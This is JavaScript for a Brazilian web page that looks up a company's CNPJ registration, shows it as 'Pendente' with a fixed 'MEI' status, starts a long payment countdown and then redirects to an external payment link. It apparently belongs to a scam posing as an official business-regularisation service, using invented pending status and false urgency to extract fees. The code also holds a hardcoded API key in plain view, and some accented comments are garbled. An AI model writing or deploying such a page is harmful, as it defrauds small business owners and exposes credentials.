// ===== VARIÃVEIS GLOBAIS =====
        let currentStep = 1;
        let cnpjData = null;
        let isProcessing = false;
        // Variáveis de controle de estado (mantidas)

        // ConfiguraÃ§Ãµes da API CNPJjÃ¡
        const API_BASE_URL = 'https://api.cnpja.com/office'; // Mantido, mas o endpoint correto Ã© 'https://api.cnpja.com/office/{cnpj}'
        const API_KEY = 'f06b18a7-2e66-4c14-af4f-0b1336575bd3-b139542f-bb82-4a3b-9fe2-f480d404ceb9'; // Chave fornecida pelo usuÃ¡rio

        // ===== UTILITÃRIOS =====
        function debounce(func, delay) {
            let timeoutId;
            return function (...args) {
                clearTimeout(timeoutId);
                timeoutId = setTimeout(() => func.apply(this, args), delay);
            };
        }

        function showSuccessNotification(message) {
            const notification = document.getElementById('successNotification');
            if (notification) {
                notification.textContent = message;
                notification.style.display = 'block';
                setTimeout(() => {
                    notification.style.display = 'none';
                }, 3000);
            }
        }

        // ===== NAVEGAÃ‡ÃƒO ENTRE ETAPAS =====
        function goToStep(stepNumber) {
            const steps = document.querySelectorAll('.step-content');
            const progressSteps = document.querySelectorAll('.step');
            const progressLineActive = document.getElementById('progressLineActive');

            steps.forEach((step, index) => {
                step.classList.remove('active');
                if (index + 1 === stepNumber) {
                    step.classList.add('active');
                }
            });

            progressSteps.forEach((step, index) => {
                const stepNumber_attr = step.getAttribute('data-step');
                step.classList.remove('active', 'completed');
                
                if (parseInt(stepNumber_attr) === stepNumber) {
                    step.classList.add('active');
                } else if (parseInt(stepNumber_attr) < stepNumber) {
                    step.classList.add('completed');
                }
            });

            const progressWidth = ((stepNumber - 1) / (progressSteps.length - 1)) * 100;
            if (progressLineActive) {
                progressLineActive.style.width = `${progressWidth}%`;
            }

            currentStep = stepNumber;
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }

        // ===== MÃSCARA DE CNPJ =====
        function applyCNPJMask(value) {
            return value
                .replace(/\D/g, '')
                .replace(/^(\d{2})(\d)/, '$1.$2')
                .replace(/^(\d{2})\.(\d{3})(\d)/, '$1.$2.$3')
                .replace(/\.(\d{3})(\d)/, '.$1/$2')
                .replace(/(\d{4})(\d)/, '$1-$2');
        }

        // ===== BUSCA DE CNPJ =====
        async function handleCNPJLookup() {
            const cnpjInput = document.getElementById('cnpj');
            const cnpj = cnpjInput.value.replace(/\D/g, '');
            const loadingIndicator = document.getElementById('cnpjLoadingIndicator');
            const cnpjInfoDisplay = document.getElementById('cnpjInfoDisplay');
            const waitingPayment = document.getElementById('waitingPayment');
            const errorEl = document.getElementById('cnpjError');

            if (cnpj.length !== 14) {
                cnpjInfoDisplay.style.display = 'none';
                waitingPayment.style.display = 'none';
                cnpjInput.classList.remove('success');
                if (errorEl) errorEl.classList.remove('show');
                return;
            }

            if (isProcessing) return;
            isProcessing = true;

            if (loadingIndicator) {
                loadingIndicator.classList.add('show');
            }

            try {
                const url = `${API_BASE_URL}/${cnpj}`; // Corrigido para o endpoint oficial da CNPJÃ¡ (Receita Federal)
        const headers = {
           'Authorization': API_KEY, // Removido 'Bearer ' conforme documentaÃ§Ã£o da CNPJÃ¡            'Content-Type': 'application/json'
        };

        const response = await fetch(url, { headers: headers,
                    signal: AbortSignal.timeout(5000)
                });

                const data = await response.json();

                await new Promise(resolve => setTimeout(resolve, 400));

if (!response.ok || data.error) {
            const errorMessage = data.message || data.error || 'CNPJ não encontrado ou inválido.';
            throw new Error(errorMessage);
        }

                // A CNPJjÃ¡ retorna os dados diretamente no corpo da resposta
                cnpjData = data;
                displayCNPJInfo(data, cnpjInput.value);
                cnpjInput.classList.add('success');
                cnpjInput.classList.remove('error');
                if (errorEl) errorEl.classList.remove('show');
                cnpjInfoDisplay.style.display = 'block';
                waitingPayment.style.display = 'block';
                startCountdown();
                showSuccessNotification();

                

                

                

                
            } catch (error) {
                console.error('Erro ao buscar CNPJ:', error);
                showCNPJError(error.message || 'Erro ao buscar CNPJ. Verifique se o CNPJ está correto ou tente novamente mais tarde.');
            } finally {
                if (loadingIndicator) {
                    loadingIndicator.classList.remove('show');
                }
                isProcessing = false;
            }
        }

        function displayCNPJInfo(data, formattedCnpj) {
            const cnpjInfoGrid = document.getElementById('cnpjInfoGrid');
            const paymentCnpjInfoGrid = document.getElementById('paymentCnpjInfoGrid');

const infoItems = [
{ label: 'CNPJ', value: formattedCnpj || data.cnpj || '-' },
					                { label: 'Formalização', value: '<span class="status-pending">Pendente</span>' },
				                // Removido: Data da SituaÃ§Ã£o
				                { label: 'Razão Social', value: data.company?.name || data.name || '-' },
				                // Removido: Nome Fantasia
				                { label: 'Natureza Jurídica', value: 'MEI' },
				                // Removido: Porte
				                { label: 'Data de Abertura', value: data.founded || '-' },
				                { label: 'Atividade Principal', value: data.mainActivity?.description || data.company?.mainActivity?.description || '-' },
				                { label: 'Endereço', value: `${data.address?.street || ''}, ${data.address?.number || ''} ${data.address?.complement || ''} - ${data.address?.district || ''}, ${data.address?.city || ''}/${data.address?.state || ''} - CEP: ${data.address?.zip || ''}`.trim() },
				                { label: 'Telefone', value: data.phones?.[0]?.number || '-' },
				                { label: 'E-mail', value: data.emails?.[0]?.address || '-' }
				            ];

            const htmlContent = infoItems.map(item => `
                <div class="cnpj-info-item">
                    <span class="cnpj-info-label">${item.label}</span>
                    <span class="cnpj-info-value">${item.value}</span>
                </div>
            `).join('');

            if (cnpjInfoGrid) cnpjInfoGrid.innerHTML = htmlContent;
            if (paymentCnpjInfoGrid) paymentCnpjInfoGrid.innerHTML = htmlContent;
        }

        // ===== LÓGICA DE CONTAGEM REGRESSIVA =====
        let countdownInterval;
        const initialTimeSeconds = 43 * 60 + 27; // 3:35 em segundos

        function startCountdown() {
            let timeRemaining = initialTimeSeconds;
            const timerDisplay = document.getElementById('countdownTimer');

            function updateTimer() {
                const minutes = Math.floor(timeRemaining / 60);
                const seconds = timeRemaining % 60;
                
                const formattedTime = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
                
                if (timerDisplay) {
                    timerDisplay.textContent = formattedTime;
                }

                if (timeRemaining <= 0) {
                    clearInterval(countdownInterval);
                    // Opcional: Adicionar lógica para o que acontece quando o tempo acaba (ex: bloquear)
                    console.log();
                } else {
                    timeRemaining--;
                }
            }

            // Garante que o timer comece imediatamente
            updateTimer();
            countdownInterval = setInterval(updateTimer, 1000);
        }

        // A contagem regressiva deve ser iniciada quando o alerta de pagamento é exibido.
        // O alerta é exibido dentro de handleCNPJLookup na linha 124.
        // Vamos adicionar a chamada para startCountdown() lá.

        function showCNPJError(message) {
            const cnpjInput = document.getElementById('cnpj');
            const errorEl = document.getElementById('cnpjError');
            const cnpjInfoDisplay = document.getElementById('cnpjInfoDisplay');
            const waitingPayment = document.getElementById('waitingPayment');

            cnpjInput.classList.add('error');
            cnpjInput.classList.remove('success');
            if (errorEl) {
                errorEl.textContent = message;
                errorEl.classList.add('show');
            }
            cnpjInfoDisplay.style.display = 'none';
            waitingPayment.style.display = 'none';
        }

        // ===== HANDLERS DE FORMULÃRIO =====
        function handleCNPJFormSubmit(e) {
            e.preventDefault();
            // A busca agora Ã© acionada ao preencher o campo ou clicar em Prosseguir
        }

        async function handleConfirmationSubmit(e) {
            e.preventDefault();

            const checkboxes = e.target.querySelectorAll('input[type="checkbox"][required]');
            let allChecked = true;

            checkboxes.forEach(checkbox => {
                if (!checkbox.checked) {
                    allChecked = false;
                    checkbox.style.outline = '2px solid var(--error-color)';
                } else {
                    checkbox.style.outline = 'none';
                }
            });

            if (!allChecked) {
                alert('Por favor, aceite todos os termos para continuar.');
                return;
            }

            const submitBtn = e.target.querySelector('button[type="submit"]');
            const loadingOverlay = document.getElementById('loadingOverlay');

            if (submitBtn) submitBtn.classList.add('btn-loading');
            if (loadingOverlay) loadingOverlay.style.display = 'flex';

            try {
                await new Promise(resolve => setTimeout(resolve, 3000));
                window.location.href = 'https://pay.pag-br.com/r/0S1HF964A1ji8335';
            } catch (error) {
                console.error('Erro:', error);
                alert('Erro ao processar. Tente novamente.');
            } finally {
                if (submitBtn) submitBtn.classList.remove('btn-loading');
                if (loadingOverlay) loadingOverlay.style.display = 'none';
            }
        }

        // ===== INICIALIZAÃ‡ÃƒO =====
        document.addEventListener('DOMContentLoaded', function() {
            // FormulÃ¡rio CNPJ
            const cnpjForm = document.getElementById('cnpjForm');
            if (cnpjForm) {
                cnpjForm.addEventListener('submit', handleCNPJFormSubmit);

                const prosseguirBtn = document.getElementById('btn-prosseguir');
                if (prosseguirBtn) {
                    prosseguirBtn.addEventListener('click', () => {
                        if (cnpjData) { // Verifica se os dados do CNPJ foram carregados
                            goToStep(2);
                        } else {
                            showCNPJError('Por favor, digite um CNPJ válido antes de prosseguir.');
                        }
                    });
                }
            }

            // MÃ¡scara de CNPJ
            const cnpjInput = document.getElementById('cnpj');
            if (cnpjInput) {
                cnpjInput.addEventListener('input', function(e) {
                    const cursorPosition = e.target.selectionStart;
                    const oldValue = e.target.value;
                    const newValue = applyCNPJMask(oldValue);

                    if (newValue !== oldValue) {
                        e.target.value = newValue;
                        const newCursorPosition = cursorPosition + (newValue.length - oldValue.length);
                        e.target.setSelectionRange(newCursorPosition, newCursorPosition);
                    }

                    // Busca automÃ¡tica quando CNPJ estÃ¡ completo
                    if (newValue.replace(/\D/g, '').length === 14) {
                        handleCNPJLookup();
                    }
                });
            }

            // FormulÃ¡rio de ConfirmaÃ§Ã£o
            const confirmationForm = document.getElementById('confirmationForm');
            if (confirmationForm) {
                confirmationForm.addEventListener('submit', handleConfirmationSubmit);
            }
        });
